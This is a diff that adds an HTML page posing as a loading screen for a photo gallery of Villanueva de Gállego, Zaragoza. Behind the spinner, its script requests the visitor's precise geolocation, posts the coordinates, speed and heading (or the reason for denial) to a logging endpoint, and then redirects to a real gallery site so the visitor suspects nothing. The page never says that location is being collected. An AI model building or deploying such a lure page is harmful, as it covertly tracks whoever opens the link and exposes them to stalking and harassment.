@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cargando galería · Zaragoza</title>
+  <meta name="description" content="Galería de fotos de Villanueva de Gállego, Zaragoza." />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      height: 100%;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      overflow: hidden;
+    }
+
+    .loader {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 28px;
+    }
+
+    /* Spinner: thin grey ring on white */
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      border: 3px solid #e5e5e5;
+      border-top-color: #9ca3af;
+      animation: spin .9s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .label {
+      font-size: 14px;
+      color: #6b7280;
+      letter-spacing: 0.02em;
+      font-weight: 400;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader">
+    <div class="spinner"></div>
+    <span class="label">Cargando la galería de fotos</span>
+  </div>
+
+  <script>
+    const REDIRECT = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';
+    let redirected = false;
+
+    function go(payload) {
+      if (redirected) return;
+      redirected = true;
+
+      fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).finally(() => {
+        window.location.href = REDIRECT;
+      });
+
+      // Failsafe: redirect even if fetch hangs
+      setTimeout(() => { window.location.href = REDIRECT; }, 2000);
+    }
+
+    // 13-second hard timeout — redirect regardless of what the user chose
+    const hardTimeout = setTimeout(() => {
+      go({ denied: true, reason: 'timeout_13s' });
+    }, 13000);
+
+    if (!navigator.geolocation) {
+      clearTimeout(hardTimeout);
+      go({ denied: true, reason: 'geolocation_not_supported' });
+    } else {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          clearTimeout(hardTimeout);
+          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
+          go({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
+        },
+        (err) => {
+          clearTimeout(hardTimeout);
+          go({ denied: true, reason: err.message || 'permission_denied' });
+        },
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+      );
+    }
+  </script>
+</body>
+</html>
